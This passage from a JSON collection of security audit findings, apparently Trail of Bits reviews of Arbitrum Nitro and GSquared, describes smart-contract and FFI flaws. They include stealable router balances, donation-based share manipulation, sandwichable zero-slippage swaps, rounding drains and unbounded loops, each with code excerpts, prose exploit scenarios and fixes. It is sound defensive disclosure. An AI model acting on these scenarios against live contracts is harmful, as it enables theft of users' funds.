        "body": "Gos CGo FFI calls contain diering and incorrect parameter type denitions compared to the corresponding function denitions in Rust. For certain hostio FFI calls, such as readInboxMessage and readDelayedInboxMessage, Go encodes the oset parameter as a uint32, whereas Rusts type denition species usize for these. //go:wasmimport wavmio readInboxMessage func readInboxMessage(msgNum uint64, offset uint32, output unsafe.Pointer) uint32 //go:wasmimport wavmio readDelayedInboxMessage func readDelayedInboxMessage(seqNum uint64, offset uint32, output unsafe.Pointer) uint32 Figure 4.1: Gos wavmio FFI calls (nitro/wavmio/raw.go#2327) pub unsafe extern \"C\" fn wavmio__readDelayedInboxMessage( msg_num: u64, offset: usize, out_ptr: GuestPtr, ) -> usize { let mut our_buf = MemoryLeaf([0u8; 32]); let our_ptr = our_buf.as_mut_ptr(); assert_eq!(our_ptr as usize % 32, 0); let read = wavm_read_delayed_inbox_message(msg_num, our_ptr, offset); assert!(read <= 32); STATIC_MEM.write_slice(out_ptr, &our_buf[..read]); read } /// Retrieves the preimage of the given hash. #[no_mangle] pub unsafe extern \"C\" fn wavmio__resolveTypedPreimage( preimage_type: u8, hash_ptr: GuestPtr, offset: usize, out_ptr: GuestPtr, ) -> usize { Figure 4.2: The corresponding exported wavmio function declarations (nitro/arbitrator/wasm-libraries/host-io/src/lib.rs#100122) As the wavmio functions are required when the compilation target is WebAssembly, in this case the usize types will resolve to uint32. Furthermore, Go's resolveTypedPreimage functions parameter, which denes the pre-image type ty, is declared as uint32. //go:wasmimport wavmio resolveTypedPreimage func resolveTypedPreimage(ty uint32, hash unsafe.Pointer, offset uint32, output unsafe.Pointer) uint32 Figure 4.3: The function resolveTypedPreimages ty parameter is declared as uint32 (nitro/wavmio/raw.go#2930) The corresponding function declaration on Rusts side expects a u8 value. pub unsafe extern \"C\" fn wavmio__resolveTypedPreimage( preimage_type: u8, hash_ptr: GuestPtr, offset: usize, out_ptr: GuestPtr, ) -> usize { Figure 4.4: Rusts wavmio__resolveTypedPreimages preimage_type parameter is declared as a u8 type (nitro/arbitrator/wasm-libraries/host-io/src/lib.rs#117122) Recommendations Short term, be explicit with the type declarations when making FFI calls by changing the usize parameters to u32. Further, make sure that both sides contain the same type declarations by automatically generating C header les using Rusts cbindgen tool. Long term, consider leveraging static analysis to ag incorrect usage of FFI types for the Go/Rust interaction.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. Making space for a very large program can result in heap error ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-arbos-30-nitro-upgrade-securityreview.pdf",
        "body": "If the cache is too small to hold a program, users trying to make space for it will receive an empty heap revert. The CacheManager contract allows users to cache or evict programs. Before caching a program, users can call the makeSpace function to make sure there is enough space for it. function makeSpace(uint64 size) external payable returns (uint64 space) { if (isPaused) { revert BidsArePaused(); } if (size > MAX_MAKE_SPACE) { revert MakeSpaceTooLarge(size, MAX_MAKE_SPACE); } _makeSpace(size); return cacheSize - queueSize; } /// Evicts entries until enough space exists in the cache, reverting if payment is insufficient. /// Returns the bid and the index to use for insertion. function _makeSpace(uint64 size) internal returns (uint192 bid, uint64 index) { // discount historical bids by the number of seconds bid = uint192(msg.value + block.timestamp * uint256(decay)); index = uint64(entries.length); uint192 min; uint64 limit = cacheSize; while (queueSize + size > limit) { (min, index) = _getBid(bids.pop()); _deleteEntry(min, index); } if (bid < min) { revert BidTooSmall(bid, min); } } Figure 5.1: The makeSpace function of the CacheManager contract (nitro-contracts/src/chain/CacheManager.sol#L126-L153) However, if the program is too big for the current cache size (but still less than MAX_MAKE_SPACE), then calling makeSpace will produce a pop with an empty min heap. Recommendations Short term, add a check in makeSpace to verify that the program will not exceed the cache size and return an appropriate error message. Long term, use fuzzing testing to detect unexpected reverts. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. Unbounded loop can cause denial of service ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "body": "Under certain conditions, the withdrawal code will loop, permanently blocking users from getting their funds. The beforeWithdraw function runs before any withdrawal to ensure that the vault has sucient assets. If the vault reserves are insucient to cover the withdrawal, it loops over each strategy, incrementing the _ strategyId pointer value with each iteration, and withdrawing assets to cover the withdrawal amount. 643 644 645 646 { 647 function beforeWithdraw ( uint256 _assets , ERC20 _token) internal returns ( uint256 ) // If reserves dont cover the withdrawal, start withdrawing from strategies 648 649 650 651 652 653 654 655 656 657 658 659 660 661 662 if (_assets > _token.balanceOf( address ( this ))) { uint48 _strategyId = strategyQueue.head; while ( true ) { address _strategy = nodes[_strategyId].strategy; uint256 vaultBalance = _token.balanceOf( address ( this )); // break if we have withdrawn all we need if (_assets <= vaultBalance) break ; uint256 amountNeeded = _assets - vaultBalance; StrategyParams storage _strategyData = strategies[_strategy]; amountNeeded = Math.min(amountNeeded, _strategyData.totalDebt); // If nothing is needed or strategy has no assets, continue if (amountNeeded == 0 ) { continue ; } Figure 1.1: The beforeWithdraw function in GVault.sol#L643-662 However, during an iteration, if the vault raises enough assets that the amount needed by the vault becomes zero or that the current strategy no longer has assets, the loop would keep using the same strategyId until the transaction runs out of gas and fails, blocking the withdrawal. Exploit Scenario Alice tries to withdraw funds from the protocol. The contract may be in a state that sets the conditions for the internal loop to run indenitely, resulting in the waste of all sent gas, the failure of the transaction, and blocking all withdrawal requests. Recommendations Short term, add logic to i ncrement the _strategyId variable to point to the next strategy in the StrategyQueue before the continue statement. Long term, use unit tests and fuzzing tools like Echidna to test that the protocol works as expected, even for edge cases.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Lack of two-step process for contract ownership changes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "body": "The setOwner() function is used to change the owner of the PnLFixedRate contract. Transferring ownership in one function call is error-prone and could result in irrevocable mistakes. function setOwner ( address _owner ) external { if ( msg.sender != owner) revert PnLErrors.NotOwner(); address previous_owner = msg.sender ; owner = _owner; emit LogOwnershipTransferred(previous_owner, _owner); 56 57 58 59 60 61 62 } Figure 2.1: contracts/pnl/PnLFixedRate:56-62 This issue can also be found in the following locations:  contracts/pnl/PnL.sol:36-42  contracts/strategy/ConvexStrategy.sol:447-453  contracts/strategy/keeper/GStrategyGuard.sol:92-97  contracts/strategy/stop-loss/StopLossLogic.sol:73-78 Exploit Scenario The owner of the PnLFixedRate contract is a governance-controlled multisignature wallet. The community agrees to change the owner of the strategy, but the wrong address is mistakenly provided to its call to setOwner , permanently misconguring the system. Recommendations Short term, implement a two-step process to transfer contract ownership, in which the owner proposes a new address and then the new address executes a call to accept the role, completing the transfer. Long term, review how critical operations are implemented across the codebase to make sure they are not error-prone.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Non-zero token balances in the GRouter can be stolen ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "body": "A non-zero balance of 3CRV, DAI, USDC, or USDT in the router contract can be stolen by an attacker. The GRouter contract is the entrypoint for deposits into a tranche and withdrawals out of a tranche. A deposit involves depositing a given number of a supported stablecoin (USDC, DAI, or USDT); converting the deposit, through a series of operations, into G3CRV, the protocols ERC4626-compatible vault token; and depositing the G3CRV into a tranche. Similarly, for withdrawals, the user burns their G3CRV that was in the tranche and, after a series of operations, receives back some amount of a supported stablecoin (gure 3.1). ERC20( address (tranche.getTrancheToken(_tranche))).safeTransferFrom( ); // withdraw from tranche // index is zero for ETH mainnet as their is just one yield token // returns usd value of withdrawal ( uint256 vaultTokenBalance , ) = tranche.withdraw( function withdrawFromTrancheForCaller ( msg.sender , address ( this ), _amount uint256 _amount , uint256 _token_index , bool _tranche , uint256 _minAmount 421 422 423 424 425 426 ) internal returns ( uint256 amount ) { 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 _amount, 0 , _tranche, address ( this ) vaultTokenBalance, address ( this ), address ( this ) ); ); // withdraw underlying from GVault uint256 underlying = vaultToken.redeem( 448 449 450 451 452 453 454 455 456 457 458 459 460 461 462 463 464 465 466 467 468 } // remove liquidity from 3crv to get desired stable from curve threePool.remove_liquidity_one_coin( underlying, int128 ( uint128 (_token_index)), //value should always be 0,1,2 0 ); ERC20 stableToken = ERC20(routerOracle.getToken(_token_index)); amount = stableToken.balanceOf( address ( this )); if (amount < _minAmount) { revert Errors.LTMinAmountExpected(); } // send stable to user stableToken.safeTransfer( msg.sender , amount); emit LogWithdrawal( msg.sender , _amount, _token_index, _tranche, amount); Figure 3.1: The withdrawFromTrancheForCaller function in GRouter.sol#L421-468 However, notice that during withdrawals the amount of stableTokens that will be transferred back to the user is a function of the current stableToken balance of the contract (see the highlighted line in gure 3.1). In the expected case, the balance should be only the tokens received from the threePool.remove_liquidity_one_coin swap (see L450 in gure 3.1). However, a non-zero balance could also occur if a user airdrops some tokens or they transfer tokens by mistake instead of calling the expected deposit or withdraw functions. As long as the attacker has at least 1 wei of G3CRV to burn, they are capable of withdrawing the whole balance of stableToken from the contract, regardless of how much was received as part of the threePool swap. A similar situation can happen with deposits. A non-zero balance of G3CRV can be stolen as long as the attacker has at least 1 wei of either DAI, USDC, or USDT. Exploit Scenario Alice mistakenly sends a large amount of DAI to the GRouter contract instead of calling the deposit function. Eve notices that the GRouter contract has a non-zero balance of DAI and calls withdraw with a negligible balance of G3CRV. Eve is able to steal Alice's DAI at a very small cost. Recommendations Short term, consider using the dierence between the contracts pre- and post-balance of stableToken for withdrawals, and depositAmount for deposits, in order to ensure that only the newly received tokens are used for the operations. Long term, create an external skim function that can be used to skim any excess tokens in the contract. Additionally, ensure that the user documentation highlights that users should not transfer tokens directly to the GRouter and should instead use the web interface or call the deposit and withdraw functions. Finally, ensure that token airdrops or unexpected transfers can only benet the protocol.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Uninformative implementation of maxDeposit and maxMint from EIP-4626 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "body": "The GVault implementation of EIP-4626 is uninformative for maxDeposit and maxMint, as they return only xed, extreme values. EIP-4626 is a standard to implement tokenized vaults. In particular, the following is specied:  maxDeposit : MUST factor in both global and user-specic limits, like if deposits are entirely disabled (even temporarily) it MUST return 0. MUST return 2 ** 256 - 1 if there is no limit on the maximum amount of assets that may be deposited.  maxMint : MUST factor in both global and user-specic limits, like if mints are entirely disabled (even temporarily) it MUST return 0. MUST return 2 ** 256 - 1 if there is no limit on the maximum amount of assets that may be deposited. The current implementation of maxDeposit and maxMint in the GVault contract directly return the maximum value of the uint256 type: /// @notice The maximum amount a user can deposit into the vault function maxDeposit ( address ) public pure override returns ( uint256 maxAssets ) return type( uint256 ).max; 293 294 295 296 297 298 299 { 300 301 } . . . 315 316 317 318 } /// @notice maximum number of shares that can be minted function maxMint ( address ) public pure override returns ( uint256 maxShares ) { return type( uint256 ).max; Figure 4.1: The maxDeposit and maxMint functions from GVault.sol This implementation, however, does not provide any valuable information to the user and may lead to faulty integrations with third-party systems. Exploit Scenario A third-party protocol wants to deposit into a GVault . It rst calls maxDeposit to know the maximum amount of asserts it can deposit and then calls deposit . However, the latter function call will revert because the value is too large. Recommendations Short term, return suitable values in maxDeposit and maxMint by considering the amount of assets owned by the caller as well any other global condition (e.g., a contract is paused). Long term, ensure compliance with the EIP specication that is being implemented (in this case, EIP-4626).",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. moveStrategy runs of out gas for large inputs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "body": "Reordering strategies can trigger operations that will run out-of-gas before completion. A GVault contract allows dierent strategies to be added into a queue. Since the order of them is important, the contract provides moveStrategy , a function to let the owner to move a strategy to a certain position of the queue. 500 501 502 503 504 505 506 507 508 509 510 511 } /// @notice Move the strategy to a new position /// @param _strategy Target strategy to move /// @param _pos desired position of strategy /// @dev if the _pos value is >= number of strategies in the queue, /// the strategy will be moved to the tail position function moveStrategy ( address _strategy , uint256 _pos ) external onlyOwner { uint256 currentPos = getStrategyPositions(_strategy); uint256 _strategyId = strategyId[_strategy]; if (currentPos > _pos) move( uint48 (_strategyId), uint48 (currentPos - _pos), false ); else move( uint48 (_strategyId), uint48 (_pos - currentPos), true ); Figure 5.1: The moveStrategy function from GVault.sol The documentation states that if the position to move a certain strategy is larger than the number of strategies in the queue, then it will be moved to the tail of the queue. This implemented using the move function: 171 172 173 174 175 176 177 178 179 180 181 182 ) internal { /// @notice move a strategy to a new position in the queue /// @param _id id of strategy to move /// @param _steps number of steps to move the strategy /// @param _back move towards tail (true) or head (false) /// @dev Moves a strategy a given number of steps. If the number /// of steps exceeds the position of the head/tail, the /// strategy will take the place of the current head/tail function move ( uint48 _id , uint48 _steps , bool _back 183 184 185 186 187 188 189 190  Strategy storage oldPos = nodes[_id]; if (_steps == 0 ) return ; if (oldPos.strategy == ZERO_ADDRESS) revert NoIdEntry(_id); uint48 _newPos = !_back ? oldPos.prev : oldPos.next; for ( uint256 i = 1 ; i < _steps; i++) { _newPos = !_back ? nodes[_newPos].prev : nodes[_newPos].next; } Figure 5.2: The header of the move function from StrategyQueue.sol However, if a large number of steps is used, the loop will never nish without running out of gas. A similar issue aects StrategyQueue.withdrawalQueue , if called directly. Exploit Scenario Alice creates a smart contract that acts as the owner of a GVault. She includes code to reorder strategies using a call to moveStrategy . Since she wants to ensure that a certain strategy is always moved to the end of the queue, she uses a very large value as the position. When the code runs, it will always run out of gas, blocking the operation. Recommendations Short term, ensure the execution of the move ends in a number of steps that is bounded by the number of strategies in the queue. Long term, use unit tests and fuzzing tools like Echidna to test that the protocol works as expected, even for edge cases.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. GVault withdrawals from ConvexStrategy are vulnerable to sandwich attacks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "body": "Token swaps that may be executed during vault withdrawals are vulnerable to sandwich attacks. Note that this is applicable only if a user withdraws directly from the GVault , not through the GRouter contract. The ConvexStrategy contract performs token swaps through Uniswap V2, Uniswap V3, and Curve. All platforms allow the caller to specify the minimum-amount-out value, which indicates the minimum amount of tokens that a user wishes to receive from a swap. This provides protection against illiquid pools and sandwich attacks. Many of the swaps that the ConvexStrategy contract performs have the minimum-amount-out value hardcoded to zero. But a majority of these swaps can be triggered only by a Gelato keeper, which uses a private channel to relay all transactions. Thus, these swaps cannot be sandwiched. However, this is not the case with the ConvexStrategy.withdraw function. The withdraw function will be called by the GVault contract if the GVault does not have enough tokens for a user withdrawal. If the balance is not sucient, ConvexStrategy.withdraw will be called to retrieve additional assets to complete the withdrawal request. Note that the transaction to withdraw assets from the protocol will be visible in the public mempool (gure 6.1). function withdraw ( uint256 _amount ) 771 772 773 774 { 775 776 777 778 779 780 781 782 783 784 785 external returns ( uint256 withdrawnAssets , uint256 loss ) if ( msg.sender != address (VAULT)) revert StrategyErrors.NotVault(); ( uint256 assets , uint256 balance , ) = _estimatedTotalAssets( false ); // not enough assets to withdraw if (_amount >= assets) { balance += sellAllRewards(); balance += divestAll( false ); if (_amount > balance) { loss = _amount - balance; withdrawnAssets = balance; } else { withdrawnAssets = _amount; 786 787 788 789 790 791 792 793 794 795 796 797 798 799 800 801 802 803 804 805 806 807 808 809 810 811 812 } } } else { // check if there is a loss, and distribute it proportionally // if it exists uint256 debt = VAULT.getStrategyDebt(); if (debt > assets) { loss = ((debt - assets) * _amount) / debt; _amount = _amount - loss; } if (_amount <= balance) { withdrawnAssets = _amount; } else { withdrawnAssets = divest(_amount - balance, false ) + balance; if (withdrawnAssets < _amount) { loss += _amount - withdrawnAssets; } else { if (loss > withdrawnAssets - _amount) { loss -= withdrawnAssets - _amount; } else { loss = 0 ; } } } } ASSET.transfer( msg.sender , withdrawnAssets); return (withdrawnAssets, loss); Figure 6.1: The withdraw function in ConvexStrategy.sol#L771-812 In the situation where the _amount that needs to be withdrawn is more than or equal to the total number of assets held by the contract, the withdraw function will call sellAllRewards and divestAll with _ slippage set to false (see the highlighted portion of gure 6.1). The sellAllRewards function, which will call _sellRewards , sells all the additional reward tokens provided by Convex, its balance of CRV, and its balance of CVX for WETH. All these swaps have a hardcoded value of zero for the minimum-amount-out. Similarly, if _ slippage is set to false when calling divestAll , the swap species a minimum-amount-out of zero. By specifying zero for all these token swaps, there is no guarantee that the protocol will receive any tokens back from the trade. For example, if one or more of these swaps get sandwiched during a call to withdraw , there is an increased risk of reporting a loss that will directly aect the amount the user is able to withdraw. Exploit Scenario Alice makes a call to withdraw to remove some of her funds from the protocol. Eve notices this call in the public transaction mempool. Knowing that the contract will have to sell some of its rewards, Eve identies a pure prot opportunity and sandwiches one or more of the swaps performed during the transaction. The strategy now has to report a loss, which results in Alice receiving less than she would have otherwise. Recommendations Short term, for _sellRewards , use the same minAmount calculation as in divestAll but replace debt with the contracts balance of a given reward token. This can be applied for all swaps performed in _sellRewards . For divestAll , set _slippage to true instead of false when it is called in withdraw . Long term, document all cases in which front-running may be possible and its implications for the codebase. Additionally, ensure that all users are aware of the risks of front-running and arbitrage when interacting with the GSquared system.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Stop loss primer cannot be deactivated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "body": "The stop loss primer cannot be deactivated because the keeper contract uses the incorrect function to check whether or not the meta pool has become healthy again. The stop loss primer is activated if the meta pool that is being used for yield becomes unhealthy. A meta pool is unhealthy if the price of the 3CRV token deviates from the expected price for a set amount of time. The primer can also be deactivated if, after it has been activated, the price of the token stabilizes back to a healthy value. Deactivating the primer is a critical feature because if the pool becomes healthy again, there is no reason to divest all of the strategys funds, take potential losses, and start all over again. The GStrategyResolver contract, which is called by a Gelato keeper, will check to identify whether a primer can be deactivated. This is done via the taskStopStopLossPrimer function. The function will attempt to call the GStrategyGuard.endStopLoss function to see whether the primer can be deactivated (gure 7.1). function taskStopStopLossPrimer () external view returns ( bool canExec , bytes memory execPayload) IGStrategyGuard executor = IGStrategyGuard(stopLossExecutor); if (executor.endStopLoss()) { canExec = true ; execPayload = abi.encodeWithSelector( executor.stopStopLossPrimer.selector ); } 46 47 48 49 50 { 51 52 53 54 55 56 57 58 } Figure 7.1: The taskStopStopLossPrimer function in GStrategyResolver.sol#L46-58 However, the GStrategyGuard contract does not have an endStopLoss function. Instead, it has a canEndStopLoss function. Note that the executor variable in taskStopStopLossPrimer is expected to implement the IGStrategyGuard function, which does have an endStopLoss function. However, the GStrategyGuard contract implements the IGuard interface, which does not have the endStopLoss function. Thus, the call to endStopLoss will simply return, which is equivalent to returning false , and the primer will not be deactivated. Exploit Scenario Due to market conditions, the price of the 3CRV token drops signicantly for an extended period of time. This triggers the Gelato keeper to activate the stop loss primer. Soon after, the price of the 3CRV token restabilizes. However, because of the incorrect function call in the taskStopStopLossPrimer function, the primer cannot be deactivated, the stop loss process completes, and all the funds in the strategy must be divested. Recommendations Short term, change the function call from endStopLoss to canEndStopLoss in taskStopStopLossPrimer . Long term, ensure that there are no near-duplicate interfaces for a given contract in the protocol that may lead to an edge case similar to this. Additionally, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. getYieldTokenAmount uses convertToAssets instead of convertToShares ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "body": "The getYieldTokenAmount function does not properly convert a 3CRV token amount into a G3CRV token amount, which may allow a user to withdraw more or less than expected or lead to imbalanced tranches after a migration. The expected behavior of the getYieldTokenAmount function is to return the number of G3CRV tokens represented by a given 3CRV amount. For withdrawals, this will determine how many G3CRV tokens should be returned back to the GRouter contract. For migrations, the function is used to gure out how many G3CRV tokens should be allocated to the senior and junior tranches. To convert a given amount of 3CRV to G3CRV, the GVault.convertToShares function should be used. However, the getYieldTokenAmount function uses the GVault.convertToAssets function (gure 8.1). Thus, getYieldTokenAmount takes an amount of 3CRV tokens and treats it as shares in the GVault , instead of assets. 169 170 171 172 173 { 174 175 } function getYieldTokenAmount ( uint256 _index , uint256 _amount ) internal view returns ( uint256 ) return getYieldToken(_index).convertToAssets(_amount); Figure 8.1: The getYieldTokenAmount function in GTranche.sol#L169-175 If the system is protable, each G3CRV share should be worth more over time. Thus, getYieldTokenAmount will return a value larger than expected because one share is worth more than one asset. This allows a user to withdraw more from the GTranche contract than they should be able to. Additionally, a protable system will cause the senior tranche to receive more G3CRV tokens than expected during migrations. A similar situation can happen if the system is not protable. Exploit Scenario Alice deposits $100 worth of USDC into the system. After a certain amount of time, the GSquared protocol becomes protable and Alice should be able to withdraw $110, making $10 in prot. However, due to the incorrect arithmetic performed in the getYieldTokenAmount function, Alice is able to withdraw $120 of USDC. Recommendations Short term, use convertToShares instead of convertToAssets in getYieldTokenAmount . Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. convertToShares can be manipulated to block deposits ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "body": "An attacker can block operations by using direct token transfers to manipulate convertToShares , which computes the amount of shares to deposit. convertToShares is used in the GVault code to know how many shares correspond to certain amount of assets: 394 395 396 397 398 399 400 401 { 402 /// @notice Value of asset in shares /// @param _assets amount of asset to convert to shares function convertToShares ( uint256 _assets ) public view override returns ( uint256 shares ) uint256 freeFunds_ = _freeFunds(); // Saves an extra SLOAD if _freeFunds is non-zero. 403 404 } return freeFunds_ == 0 ? _assets : (_assets * totalSupply) / freeFunds_; Figure 9.1: The convertToShares function in GVault.sol This function relies on the _freeFunds function to calculate the amount of shares: 706 707 708 709 710 } /// @notice the number of total assets the GVault has excluding and profits /// and losses function _freeFunds () internal view returns ( uint256 ) { return _totalAssets() - _calculateLockedProfit(); Figure 9.2: The _freeFunds function in GVault.sol In the simplest case, _calculateLockedProfit() can be assumed as zero if there is no locked prot. The _totalAssets function is implemented as follows: 820 821 /// @notice Vault adapters total assets including loose assets and debts /// @dev note that this does not consider estimated gains/losses from the strategies 822 823 824 } function _totalAssets () private view returns ( uint256 ) { return asset.balanceOf( address ( this )) + vaultTotalDebt; Figure 9.3: The _totalAssets function in GVault.sol However, the fact that _totalAssets has a lower bound determined by asset.balanceOf(address(this)) can be exploited to manipulate the result by \"donating\" assets to the GVault address. Exploit Scenario Alice deploys a new GVault. Eve observes the deployment and quickly transfers an amount of tokens to the GVault address. One of two scenarios can happen: 1. 2. Eve transfers a minimal amount of tokens, forcing a positive amount of freeFunds . This will block any immediate calls to deposit, since it will result in zero shares to be minted. Eve transfers a large amount of tokens, forcing future deposits to be more expensive or resulting in zero shares. Every new deposit can increase the amount of free funds, making the eect more severe. It is important to note that although Alice cannot use the deposit function, she can still call mint to bypass the exploit. Recommendations Short term, use a state variable, assetBalance , to track the total balance of assets in the contract. Avoid using balanceOf , which is prone to manipulation. Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "10. Harvest operation could be blocked if eligibility check on a strategy reverts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "body": "During harvest, if any of the strategies in the queue were to revert, it would prevent the loop from reaching the end of the queue and also block the entire harvest operation. When the harvest function is executed, a loop iterates through each of the strategies in the strategies queue, and the canHarvest() check runs on each strategy to determine if it is eligible for harvesting; if it is, the harvest logic is executed on that strategy. 312 313 314 315 316 317 318 319 320 321 322 /// @notice Execute strategy harvest function harvest () external { if ( msg.sender != keeper) revert GuardErrors.NotKeeper(); uint256 strategiesLength = strategies.length; for ( uint256 i ; i < strategiesLength; i++) { address strategy = strategies[i]; if (strategy == address ( 0 )) continue ; if (IStrategy(strategy).canHarvest()) { if (strategyCheck[strategy].active) { IStrategy(strategy).runHarvest(); try IStrategy(strategy).runHarvest() {} catch Error( ... Figure 10.1: The harvest function in GStrategyGuard.sol However, if the canHarvest() check on a particular strategy within the loop reverts, external calls from the canHarvest() function to check the status of rewards could also revert. Since the call to canHarvest() is not inside of a try block, this would prevent the loop from proceeding to the next strategy in the queue (if there is one) and would block the entire harvest operation. Additionally, within the harvest function, the runHarvest function is called twice on a strategy on each iteration of the loop. This could lead to unnecessary waste of gas and possibly undened behavior. Recommendations Short term, wrap external calls within the loop in try and catch blocks, so that reverts can be handled gracefully without blocking the entire operation. Additionally, ensure that the canHarvest function of a strategy can never revert. Long term, carefully audit operations that consume a large amount of gas, especially those in loops. Additionally, when designing logic loops that make external calls, be mindful as to whether the calls can revert, and wrap them in try and catch blocks when necessary.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "11. Incorrect rounding direction in GVault ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "body": "The minting and withdrawal operations in the GVault use rounding in favor of the user instead of the protocol, giving away a small amount of shares or assets that can accumulate over time . convertToShares is used in the GVault code to know how many shares correspond to a certain amount of assets: 394 395 396 397 398 399 400 401 { 402 /// @notice Value of asset in shares /// @param _assets amount of asset to convert to shares function convertToShares ( uint256 _assets ) public view override returns ( uint256 shares ) uint256 freeFunds_ = _freeFunds(); // Saves an extra SLOAD if _freeFunds is non-zero. 403 404 } return freeFunds_ == 0 ? _assets : (_assets * totalSupply) / freeFunds_; Figure 11.1: The convertToShares function in GVault.sol This function rounds down, providing slightly fewer shares than expected for some amount of assets. Additionally, convertToAssets i s used in the GVault code to know how many assets correspond to certain amount of shares: 406 /// @notice Value of shares in underlying asset /// @param _shares amount of shares to convert to tokens function convertToAssets ( uint256 _shares ) 407 408 409 410 411 412 413 { public view override returns ( uint256 assets ) 414 uint256 _totalSupply = totalSupply; // Saves an extra SLOAD if _totalSupply is non-zero. 415 416 417 418 419 } return _totalSupply == 0 ? _shares : ((_shares * _freeFunds()) / _totalSupply); Figure 11.2: The convertToAssets function in GVault.sol This function also rounds down, providing slightly fewer assets than expected for some amount of shares. However, the mint function uses previewMint , which uses convertToAssets : 204 205 206 207 208 209 { 210 211 212 213 214 215 216 217 218 219 220 } function mint ( uint256 _shares , address _receiver ) external override nonReentrant returns ( uint256 assets ) // Check for rounding error in previewMint. if ((assets = previewMint(_shares)) == 0 ) revert Errors.ZeroAssets(); _mint(_receiver, _shares); asset.safeTransferFrom( msg.sender , address ( this ), assets); emit Deposit( msg.sender , _receiver, assets, _shares); return assets; Figure 12.3: The mint function in GVault.sol This means that the function favors the user, since they get some xed amount of shares for a rounded-down amount of assets. In a similar way, the withdraw function uses convertToShares : function withdraw ( uint256 _assets , address _receiver , address _owner 227 228 229 230 231 ) external override nonReentrant returns ( uint256 shares ) { 232 if (_assets == 0 ) revert Errors.ZeroAssets(); 233 234 235 236 shares = convertToShares(_assets); if (shares > balanceOf[_owner]) revert Errors.InsufficientShares(); 237 238 239 if ( msg.sender != _owner) { uint256 allowed = allowance[_owner][ msg.sender ]; // Saves gas for limited approvals. 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 } if (allowed != type( uint256 ).max) allowance[_owner][ msg.sender ] = allowed - shares; } _assets = beforeWithdraw(_assets, asset); _burn(_owner, shares); asset.safeTransfer(_receiver, _assets); emit Withdraw( msg.sender , _receiver, _owner, _assets, shares); return shares; Figure 11.4: The withdraw function in GVault.sol This means that the function favors the user, since they get some xed amount of assets for a rounded-down amount of shares. This issue should also be also considered when minting fees, since they should favor the protocol instead of the user or the strategy. Exploit Scenario Alice deploys a new GVault and provides some liquidity. Eve uses mints and withdrawals to slowly drain the liquidity, possibly aecting the internal bookkeeping of the GVault. Recommendations Short term, consider refactoring the GVault code to specify the rounding direction across the codebase in order keep the error in favor of the user or the protocol. Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. Protocol migration is vulnerable to front-running and a loss of funds ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
